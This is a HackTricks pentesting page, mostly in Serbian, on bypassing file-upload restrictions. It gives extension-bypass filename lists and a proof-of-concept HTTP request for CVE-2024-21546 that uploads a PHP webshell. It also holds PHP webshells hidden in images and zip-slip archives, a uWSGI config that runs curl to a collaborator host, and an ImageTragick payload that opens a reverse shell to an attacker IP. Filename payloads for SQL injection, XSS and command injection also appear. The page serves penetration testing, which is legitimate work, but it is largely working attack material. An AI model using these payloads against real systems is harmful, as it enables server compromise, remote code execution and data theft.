# Otprema fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Druge korisne ekstenzije:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje kontrole ekstenzija

1. Ako su primenljive, **proverite** prethodne ekstenzije. Takođe ih testirajte koristeći neka **velika slova**: _pHp, .pHP5, .PhAr ..._
2. _Proverite **dodavanje validne ekstenzije pre** ekstenzije za izvršenje (koristite i prethodne ekstenzije):_
- _file.png.php_
- _file.png.Php5_
3. Pokušajte dodati **specijalne karaktere na kraju.** Možete koristiti Burp za **bruteforce** svih **ascii** i **Unicode** karaktera. (_Napomena: takođe možete pokušati koristiti **prethodno** pomenute **ekstenzije**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušajte zaobići zaštite **varajući parser ekstenzija** na serverskoj strani sa tehnikama kao što su **dupliranje** **ekstenzije** ili **dodavanje junk** podataka (**null** bytes) između ekstenzija. _Takođe možete koristiti **prethodne ekstenzije** da pripremite bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodajte **još jedan sloj ekstenzija** na prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušajte staviti **ekstenziju za izvršenje pre validne ekstenzije** i nadate se da je server pogrešno konfigurisan. (korisno za eksploataciju Apache miskonfiguracija gde će se izvršiti kod za bilo šta sa ekstenzijom **_.php_**, čak i ako fajl ne završava na .php):
- _ex: file.php.png_
7. Korišćenje **NTFS alternate data stream (ADS)** u **Windows**. U ovom slučaju, dvotačka ":" biće umetnuta posle zabranjene ekstenzije i pre dozvoljene. Kao rezultat, biće kreiran **prazan fajl sa zabranjenom ekstenzijom** na serveru (npr. "file.asax:.jpg"). Ovaj fajl se kasnije može izmeniti drugim tehnikama kao što je upotreba njegovog short filename. Šablon "**::$data**” se takođe može koristiti za kreiranje fajlova sa sadržajem. Stoga dodavanje tačke posle ovog šablona može biti korisno za zaobilaženje daljih ograničenja (npr. "file.asp::$data.").
8. Pokušajte prekoračiti limite imena fajla. Validna ekstenzija se iseče. I ostaje zlonamerni PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Neki upload handler-i skraćuju ili normalizuju završne tačke u imenu fajla. U UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) verzijama pre 2.9.1, možete zaobići validaciju ekstenzija na sledeći način:

- Korišćenjem validnog image MIME i magic header-a (npr. PNG-ov `\x89PNG\r\n\x1a\n`).
- Imenujući otpremljeni fajl sa PHP ekstenzijom praćenom tačkom, npr. `shell.php.`.
- Server uklanja završnu tačku i sačuva `shell.php`, koji će se izvršiti ako je postavljen u direktorijum koji se servira preko web-a (podrazumevano public storage kao `/storage/files/`).

Minimalni PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Zatim pristupite sačuvanoj putanji (tipično u Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigacije:
- Ažurirajte unisharp/laravel-filemanager na ≥ 2.9.1.
- Primeni stroge server-side allowlists i ponovo validiraj sačuvano ime fajla.
- Serve uploads iz neizvršnih lokacija.

### Zaobilaženje Content-Type, Magic Number, Compression & Resizing

- Zaobiđite **Content-Type** provere postavljanjem **vrednosti** **Content-Type** **header** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobiđite proveru **magic number** tako što ćete na početak fajla dodati **bajtove prave slike** (zbunite _file_ komandu). Ili ubacite shell u **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se na vašu sliku primenjuje **kompresija**, na primer koristeći neke standardne PHP biblioteke poput [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neće biti korisne. Međutim, možete koristiti **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može menjati **veličinu** **slike**, koristeći na primer PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Ipak, možete koristiti **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika za pravljenje payload-a koji **preživi promenu veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Ipak, možete koristiti **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubacite tekst koji će **preživeti kompresiju**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ostali trikovi za proveru

- Pronađite ranjivost koja omogućava **preimenovanje** već otpremljenog fajla (da se promeni ekstenzija).
- Pronađite **Local File Inclusion** ranjivost da izvršite backdoor.
- **Moguće otkrivanje informacija**:
1. Otpremite **više puta** (i u **isto vreme**) **isti fajl** sa **istim imenom**
2. Otpremite fajl sa **imenom** fajla ili foldera koji **već postoji**
3. Otpremanje fajla sa **"." , ".." ili "..." kao imenom**. Na primer, u Apache na **Windows**, ako aplikacija sačuva upload-ovane fajlove u "/www/uploads/" direktorijumu, fajl sa imenom "." će kreirati fajl nazvan "uploads" u "/www/" direktorijumu.
4. Otpremite fajl koji se možda teško briše, kao što je **"...:.jpg"** na **NTFS**. (Windows)
5. Otpremite fajl u **Windows** sa **nevažećim karakterima** kao što su `|<>*?”` u imenu. (Windows)
6. Otpremite fajl u **Windows** koristeći **rezervisane** (**zabranjene**) **nazive** kao što su CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Pokušajte takođe da **otpremite izvršni fajl** (.exe) ili **.html** (manje sumnjivo) koji će **izvršiti kod** kada ga žrtva slučajno otvori.

### Specijalni trikovi sa ekstenzijama

Ako pokušavate da otpremite fajlove na **PHP server**, [pogledajte **.htaccess** trik za izvršavanje koda](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavate da otpremite fajlove na **ASP server**, [pogledajte **.config** trik za izvršavanje koda](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi `.phar` su kao `.jar` za java, ali za php, i mogu se **koristiti kao php fajl** (izvršavajući ih sa php, ili uključujući ih unutar skripte...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za **import files**, tako da je moguće da je u nekom trenutku dozvoljeno **izvršavanje ove ekstenzije**.

## **Jetty RCE**

Ako možete da otpremite XML fajl na Jetty server, možete dobiti [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je prikazano na sledećoj slici, otpremite XML fajl u `$JETTY_BASE/webapps/` i očekujte shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljno proučavanje ove ranjivosti pogledajte originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti mogu se iskoristiti na uWSGI serverima ako napadač ima mogućnost da izmeni `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu za uključivanje "magic" varijabli, placeholder-a i operatora. Posebno, '@' operator, korišćen kao `@(filename)`, je namenjen da uključi sadržaj fajla. Među različitim podržanim scheme-ama u uWSGI, "exec" scheme je posebno moćna, omogućavajući čitanje podataka iz stdout procesa. Ova funkcionalnost se može zloupotrebiti za zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl procesuira.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracionog fajla. Da bi konfiguracija bila aktivirana i parsirana, proces uWSGI mora biti restartovan (potencijalno nakon pada ili zbog Denial of Service napada) ili fajl mora biti podešen na auto-reload. Funkcija auto-reload, ako je omogućena, ponovo učitava fajl u zadatim intervalima nakon što detektuje promene.

Ključno je razumeti labavu prirodu parsiranja konfiguracionog fajla uWSGI-a. Konkretno, pomenuti payload može biti umetnut u binarni fajl (na primer sliku ili PDF), čime se dodatno proširuje opseg potencijalne eksploatacije.

## **wget File Upload/SSRF Trick**

U nekim prilikama možeš otkriti da server koristi **`wget`** za **preuzimanje fajlova** i da možeš **navesti** **URL**. U tim slučajevima kod može proveravati da li je ekstenzija preuzetih fajlova na whitelisti kako bi se osiguralo da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **ova provera se može zaobići.**\

Najveća dužina imena fajla u **linux**u je **255**, međutim, **wget** skraćuje imena fajlova na **236** karaktera. Možeš **preuzeti fajl nazvan "A"\*232+".php"+".gif"**, ovo ime fajla će **zaobići** **proveru** (kao u ovom primeru **".gif"** je **validna** ekstenzija) ali `wget` će **preimenovati** fajl u **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesterima i Bug Hunterima pri testiranju file upload mehanizama. Koristi različite bug bounty tehnike da pojednostavi proces identifikacije i eksploatacije ranjivosti, obezbeđujući temeljne provere web aplikacija.

### Corrupting upload indices with snprintf quirks (historical)

Neki legacy upload handleri koji koriste `snprintf()` ili slične funkcije da izgrade multi-file nizove iz single-file uploada mogu biti prevareni da falsifikuju `_FILES` strukturu. Zbog neusaglašenosti i truncation u ponašanju `snprintf()`, pažljivo konstruisan single upload može izgledati kao više indeksiranih fajlova na server strani, zbunjujući logiku koja pretpostavlja striktan oblik (npr. tretira ga kao multi-file upload i ulazi u unsafe grane). Iako danas nišna pojava, ovaj obrazac “index corruption” se povremeno pojavljuje u CTF-ovima i starijim kodbasama.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različite direktorijume

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. Uprkos početnim pretpostavkama da ova konfiguracija može štititi od izvršavanja komandi na nivou OS-a putem malicioznih otpremanja fajlova, podrška za hijerarhijsku kompresiju i mogućnosti directory traversal u ZIP archive format mogu biti iskorišćene. 

To omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih direktorijuma za otpremanje manipulišući funkcionalnošću dekompresije ciljne aplikacije.

Automatizovani exploit za kreiranje takvih fajlova je dostupan na [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Alat se može koristiti na sledeći način:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Pored toga, **symlink trick with evilarc** je opcija. Ako je cilj da se targetuje fajl kao što je `/flag.txt`, treba kreirati symlink ka tom fajlu na vašem sistemu. Ovo osigurava da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

Za više detalja **pogledajte originalni post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Kreiranje PHP Shell-a**: PHP kod je napisan da izvršava komande prosleđene kroz `$_REQUEST` promenljivu.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying i kreiranje kompresovanih fajlova**: Kreira se više fajlova i sastavlja se zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modifikacija pomoću Hex Editor-a ili vi**: Imena fajlova unutar zip-a se menjaju pomoću vi ili hex editora, pritom se "xxA" menja u "../" da bi se prolazilo kroz direktorijume.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Otpremite ovaj sadržaj sa image ekstenzijom kako biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Umetanje PHP shell-a u PNG

Umetanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slike. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, pošto se obično koriste za resizing i resampling slika. Mogućnost da ugrađeni PHP shell ostane nepromenjen ovim operacijama predstavlja značajnu prednost za određene upotrebe.

Detaljno istraživanje ove tehnike, uključujući metodologiju i potencijalne primene, dostupno je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj izvor pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot fajlovi

Polyglot fajlovi predstavljaju jedinstven alat u cybersecurity-ju, ponašajući se kao kameleoni koji mogu validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovo sparivanje; kombinacije poput GIF i JS ili PPT i JS su takođe izvodljive.

Osnovna upotrebljivost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove po tipu. Uobičajena praksa u raznim aplikacijama je dozvoliti samo određene tipove fajlova za upload—poput JPEG, GIF ili DOC—kako bi se smanjio rizik od potencijalno opasnih formata (npr. JS, PHP, ili Phar fajlova). Međutim, polyglot, usklađujući se sa strukturnim kriterijumima više formata fajlova, može diskretno zaobići ta ograničenja.

Uprkos svojoj prilagodljivosti, polyglot-i imaju ograničenja. Na primer, dok polyglot može istovremeno predstavljati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog uploada može zavisiti od politike platforme vezane za ekstenzije fajlova. Ako je sistem strog po pitanju dozvoljenih ekstenzija, sama strukturna dvoličnost polyglot-a možda neće biti dovoljna da garantuje upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs kao da su PDF

Kako izbeći detekciju tipa fajla uploadovanjem validnog JSON fajla čak i ako nije dozvoljeno falsifikovanjem PDF fajla (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Sve dok se `%PDF` magic bytes nalaze u prvih 1024 bajta smatra se validnim (pogledati primer u postu)
- **`pdflib` library**: Dodajte lažni PDF format unutar polja JSON-a tako da biblioteka misli da je pdf (pogledati primer u postu)
- **`file` binary**: Može da pročita do 1048576 bajta iz fajla. Jednostavno napravite JSON veći od toga tako da ne može parsirati sadržaj kao json, a zatim unutar JSON-a stavite početni deo pravog PDF-a i pomisliće da je PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
